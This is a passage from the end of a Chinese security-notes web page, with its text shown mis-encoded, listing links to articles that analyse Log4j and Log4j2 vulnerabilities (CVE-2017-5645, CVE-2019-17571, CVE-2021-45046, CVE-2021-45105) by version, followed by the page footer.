window</span></span></a></p><p><strong>2.15.0ä¹‹å‰ç‰ˆæ¼æ´ç›¸å…³æ–‡ç« </strong></p><p><a href="https://mochazz.github.io/2019/12/26/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90//#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1" target="_blank" rel="noopener noreferrer">Log4jååºåˆ—åŒ–åˆ†æ(CVE-2019-17571&amp;CVE-2017-5645)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><strong>2.15.0ç‰ˆæ¼æ´ç›¸å…³æ–‡ç« </strong></p><p><a href="https://cloud.tencent.com/developer/article/1919456" target="_blank" rel="noopener noreferrer">å²ä¸Šæœ€å…¨ log4j2 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´æ±‡æ€»æŠ¥å‘Š<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://blog.csdn.net/weixin_44047654/article/details/128300416" target="_blank" rel="noopener noreferrer">Apache Log4j2 Lookup ä»£ç æ‰§è¡Œä¸æ‹’ç»æœåŠ¡æ¼æ´(CVE-2021-45046)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://blog.csdn.net/mole_exp/article/details/122037039" target="_blank" rel="noopener noreferrer">Log4j2 CVE-2021-45046 é¸¡è‚‹RCEæ¼æ´å¤ç°ä¸æµ…æ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><strong>2.16.0ç‰ˆæ¼æ´ç›¸å…³æ–‡ç« </strong></p><p><a href="https://blog.csdn.net/hilaryfrank/article/details/122046202" target="_blank" rel="noopener noreferrer">Log4j2ä¸­2.16.0ç‰ˆä¸­DOSæ”»å‡»ï¼ˆCVE-2021-45105ï¼‰çš„æ¼æ´åŸç†ã€å¤ç°æ­¥éª¤å’Œä¿®å¤æ–¹æ³•(2.17.0ä¿®å¤åŸç†)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></div><!--[--><!----><!--]--><footer class="page-meta"><div class="meta-item edit-link"><a href="https://github.com/echo0d/DailyNotes/edit/main/src/CyberSecurity/RedTeam/2-WebVulnerability/log4j2/log4j2 .md" rel="noopener noreferrer" target="_blank" aria-label="åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ" class="nav-link label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="meta-item git-info"><div class="update-time"><span class="label">ä¸Šæ¬¡ç¼–è¾‘äº: </span><!----></div><div class="contributors"><span class="label">è´¡çŒ®è€…: </span><!--[--><!--[--><span class="contributor" title="email: echo0d@163.com">echo0d</span><!--]--><!--]--></div></div></footer><!----><!----><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">å¬å›ä¸€å¸­è¯ï¼Œå¦‚å¬ä¸€å¸­è¯</div><div class="vp-copyright">Copyright Â© 2025 echo0d </div></footer></div><!--]--><!--[--><!----><!----><!--]--><!--]--></div>
    <script type="module" src="/DailyNotes/assets/app-HY2lwI8R.js" defer></script>
  </body>
</html>
